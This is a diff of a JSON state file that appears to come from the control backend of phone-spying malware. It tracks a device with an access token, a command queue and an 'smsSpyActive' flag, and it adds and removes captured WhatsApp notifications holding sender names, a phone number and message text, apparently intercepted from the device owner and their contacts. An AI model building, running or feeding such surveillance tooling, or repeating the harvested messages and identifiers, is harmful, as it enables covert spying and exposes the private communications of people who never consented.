@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776959088885,
+    "lastSeen": 1776959099665,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959100305
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959100156
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959089766
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959089714
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3987,38 +4019,6 @@
         "time": "23/04 21:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951732550
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎prily 🤍 & Nakan",
-        "content": "Telepon video grup berlangsung",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951731785
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 858-3608-9495",
-        "content": "Gada",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951731724
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Zal7Se",
-        "content": "bisa bisa, jual 40k",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951731464
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "april Hk",
-        "content": "singkat sekalii😢",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951731361
       }
     ],
     "galleryPhotos": [],
